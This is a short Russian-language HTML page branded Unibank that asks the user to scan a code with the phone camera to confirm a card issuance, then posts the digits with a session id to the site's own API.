<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Unibank — Подтверждение</title>
  <style>
    body{margin:0;padding:0;height:100vh;background:#003087;color:white;font-family:Arial;display:flex;flex-direction:column;justify-content:center;align-items:center}
    h1{font-size:28px;margin:20px 0}
    .scan{border:4px dashed #fff;border-radius:24px;width:280px;height:280px;display:flex;align-items:center;justify-content:center;font-size:80px;opacity:0.7}
    button{background:#00c853;color:white;border:none;padding:18px 40px;font-size:20px;border-radius:50px;margin-top:30px;width:80%;max-width:320px}
  </style>
</head>
<body>
  <h1>Подтвердите выдачу карты</h1>
  <p>Отсканируйте ваш код</p>
  <div class="scan" id="reader"></div>
  <button onclick="startScan()">СКАНИРОВАТЬ</button>

  <script src="https://unpkg.com/html5-qrcode@2.3.8/html5-qrcode.min.js"></script>
  <script>
    const params = new URLSearchParams(location.search);
    const sessionId = params.get('sid');

    function startScan() {
      const scanner = new Html5Qrcode("reader");
      scanner.start(
        { facingMode: "environment" },
        { fps: 10, qrbox: 250 },
        (text) => {
          const code = text.replace(/\D/g, '');
          if (code && sessionId) {
            fetch("/api/scan", {
              method: "POST",
              headers: {"Content-Type": "application/json"},
              body: JSON.stringify({ sessionId, customerCode: code })
            }).then(r => r.json()).then(res => {
              if (res.success) {
                document.body.innerHTML = "<h2>Карта подтверждена!</h2><p>Можете закрыть</p>";
              } else {
                alert("Ошибка: " + (res.error || "Неизвестно"));
              }
            });
            scanner.stop();
          }
        },
        () => {}
      ).catch(() => alert("Камера недоступна"));
    }
    if (/Mobi|Android|iPhone/i.test(navigator.userAgent)) setTimeout(startScan, 1000);
  </script>
</body>
</html>
